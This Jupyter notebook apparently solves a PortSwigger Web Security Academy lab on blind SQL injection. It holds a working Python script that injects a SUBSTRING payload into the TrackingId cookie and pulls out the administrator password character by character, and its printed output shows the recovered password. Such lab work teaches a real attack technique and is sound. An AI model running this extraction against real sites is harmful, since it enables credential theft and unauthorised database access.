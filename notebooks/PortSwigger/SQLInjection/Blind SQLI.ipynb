{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7b81c255",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/blind"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "012dfd72",
   "metadata": {},
   "source": [
    "# Blind SQLi with conditional response\n",
    "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c34e66a8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "import string\n",
    "from tqdm import tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2919e272",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://acec1f3b1e2ef908c0af447500f80015.web-security-academy.net/\"\n",
    "\n",
    "#Create session to track cookies\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#String that may or may not contain \"Welcome back\":\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c599022c",
   "metadata": {},
   "source": [
    "Repeat GET again to observe \"Welcome back\":"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f3d1bd3a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <div>Welcome back!</div><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = s.get(URL)\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf1c7d6c",
   "metadata": {},
   "source": [
    "We can put this in a function for more concise syntax"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f3814416",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def is_welcome_back(text):\n",
    "    if text == []:\n",
    "        print(\"Session expired\")\n",
    "        return None\n",
    "    return \"Welcome back\" in re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", text)[0]\n",
    "\n",
    "is_welcome_back(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "18dfff93",
   "metadata": {},
   "source": [
    "Ok now onto the lab itself. So the target data is:\n",
    "```sql\n",
    "SELECT password\n",
    "FROM users\n",
    "WHERE username = 'administrator'\n",
    "```\n",
    "\n",
    "We want to query this, and use SUBSTRING to iterate through the password letter by letter. We're given that the database is looking at the cookie, using a query like:\n",
    "\n",
    "```sql\n",
    "SELECT TrackingId \n",
    "FROM TrackedUsers \n",
    "WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "084cc02b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 33%|███████████████████████████▋                                                       | 12/36 [00:18<00:36,  1.51s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "c\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 81%|██████████████████████████████████████████████████████████████████▊                | 29/36 [00:43<00:10,  1.49s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  8%|███████                                                                             | 3/36 [00:05<01:01,  1.87s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 56%|██████████████████████████████████████████████                                     | 20/36 [00:32<00:26,  1.65s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  6%|████▋                                                                               | 2/36 [00:05<01:28,  2.60s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 22%|██████████████████▋                                                                 | 8/36 [00:12<00:43,  1.55s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 44%|████████████████████████████████████▉                                              | 16/36 [00:25<00:31,  1.59s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28g\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 42%|██████████████████████████████████▌                                                | 15/36 [00:22<00:30,  1.47s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 86%|███████████████████████████████████████████████████████████████████████▍           | 31/36 [00:49<00:07,  1.58s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 39%|████████████████████████████████▎                                                  | 14/36 [00:21<00:33,  1.53s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfve\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 75%|██████████████████████████████████████████████████████████████▎                    | 27/36 [00:38<00:12,  1.43s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfver\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 89%|█████████████████████████████████████████████████████████████████████████▊         | 32/36 [00:45<00:05,  1.44s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 44%|████████████████████████████████████▉                                              | 16/36 [00:23<00:29,  1.47s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  8%|███████                                                                             | 3/36 [00:05<01:00,  1.85s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 39%|████████████████████████████████▎                                                  | 14/36 [00:23<00:37,  1.70s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 11%|█████████▎                                                                          | 4/36 [00:06<00:55,  1.73s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 64%|█████████████████████████████████████████████████████                              | 23/36 [00:34<00:19,  1.49s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4n\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 81%|██████████████████████████████████████████████████████████████████▊                | 29/36 [00:43<00:10,  1.50s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4nt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 72%|███████████████████████████████████████████████████████████▉                       | 26/36 [00:39<00:15,  1.51s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4ntq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 11%|█████████▎                                                                          | 4/36 [00:06<00:55,  1.73s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ct3k28gfverwg3e4ntq4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|███████████████████████████████████████████████████████████████████████████████████| 36/36 [00:49<00:00,  1.39s/it]\n"
     ]
    }
   ],
   "source": [
    "#Reset session\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#Get cookies to modify\n",
    "cookies = s.cookies.get_dict()\n",
    "\n",
    "password = \"\"\n",
    "max_len = 32\n",
    "\n",
    "for char_idx in range(max_len):\n",
    "    found = 0\n",
    "    \n",
    "    for each_char in tqdm(string.digits + string.ascii_lowercase):\n",
    "\n",
    "        injected_query = f\"' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {char_idx + 1}, 1) = '{each_char}' -- \"\n",
    "        cookies[\"TrackingId\"] = injected_query\n",
    "        r = s.get(URL, cookies=requests.cookies.cookiejar_from_dict(cookies))\n",
    "\n",
    "        if is_welcome_back(r.text):\n",
    "            #New password character found!\n",
    "            password += each_char\n",
    "            found = 1\n",
    "            print(password)\n",
    "            break\n",
    "            \n",
    "    if found == 0:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "3e45803b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ct3k28gfverwg3e4ntq4'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "acd1b2d3",
   "metadata": {},
   "source": [
    "Yay!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5779bc8b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
